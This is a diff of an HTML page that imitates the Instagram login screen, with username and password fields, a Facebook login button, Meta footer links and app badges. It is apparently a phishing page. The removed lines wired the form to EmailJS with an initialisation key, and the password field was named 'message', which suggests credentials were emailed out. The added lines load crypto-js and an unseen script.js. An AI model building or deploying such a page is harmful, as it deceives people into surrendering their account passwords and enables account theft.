@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -13,54 +12,38 @@
             vertical-align: text-top;
         }
     </style>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script type="text/javascript">
-        emailjs.init('21JQw33lX39HDqmSE');
-    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
-
 <body>
-
-
     <div class="container">
         <div class="box">
             <div class="heading"></div>
-
             <form class="login-form" id="form">
                 <div class="field">
-                    <input id="username" type="text" name="username" placeholder="Phone number, username, or email"
-                        required />
-                    <label for="username">Phone number, username, or email</label>
+                    <input id="name" type="text" name="name" placeholder="Phone number, username, or email" required />
+                    <label for="name">Phone number, username, or email</label>
                 </div>
                 <div class="field">
-                    <input id="message" type="password" name="message" placeholder="Message" required />
-                    <label for="message">Password</label>
+                    <input id="password" type="password" name="password" placeholder="Password" required />
+                    <label for="password">Password</label>
                 </div>
                 <button class="login-button" id="submit" type="submit" title="Login">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span>
+                            <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
+                            &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
+                </div>
             </form>
-
-            <div class="separator">
-                <div class="line"></div>
-                <p>OR</p>
-                <div class="line"></div>
-            </div>
-            <div class="other">
-                <button class="fb-login-btn" type="button"
-                    onclick="window.location.href='https://www.facebook.com/login.php/'">
-                    <i class="fa fa-facebook-official fb-icon"></i>
-                    <span>
-                        <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256"
-                            height="15" width="15" />
-                        &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
-                    </span>
-                </button>
-                <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot
-                    password?</a>
-            </div>
-            </form>
-
-
-
         </div>
         <div class="box">
             <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
@@ -73,8 +56,7 @@
     <br>
     <div class="apps">
         <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN">
-            <img src="https://i.ibb.co/ZTHhz0b/playstore.png" height="40"
-                width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
+            <img src="https://i.ibb.co/ZTHhz0b/playstore.png" height="40" width="134"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
         <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US">
             <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" height="40" width="auto"></a>
     </div>
@@ -90,11 +72,8 @@
             <a style="color: #6c6c6c !important;" href="https://www.meta.com/terms/">Terms</a>
             <a style="color: #6c6c6c !important;" href="https://www.meta.com/locations/">Locations</a>
             <a style="color: #6c6c6c !important;" href="https://www.instagram.com/lite/">Instagram Lite</a>
-            <a style="color: #6c6c6c !important;" href="https://www.facebook.com/help/instagram/261704639352628">Contact
-                Uploading & Non-Users</a>
+            <a style="color: #6c6c6c !important;" href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
             <a style="color: #6c6c6c !important;" href="https://www.meta.com/verified/">Meta-verified</a>
-        </footer>
-
         </footer>
     </div>
     <div class="copyright">
@@ -151,9 +130,6 @@
             <option value="uk">Українська</option>
         </select> © 2025 Instagram from Meta
     </div>
-
+    <script src="script.js"></script>
 </body>
-<script src="script.js"></script>
-</body>
-
 </html>
